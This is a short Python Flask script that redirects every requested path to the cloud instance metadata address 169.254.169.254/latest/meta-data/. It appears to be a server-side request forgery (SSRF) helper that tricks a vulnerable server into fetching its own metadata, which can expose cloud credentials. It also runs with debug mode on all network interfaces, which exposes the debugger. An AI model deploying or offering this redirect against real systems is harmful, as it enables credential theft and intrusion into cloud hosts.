from flask import Flask, redirect

app = Flask(__name__)

@app.route("/<path:path>")
def redir(path):
    return redirect("http://169.254.169.254/latest/meta-data/")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
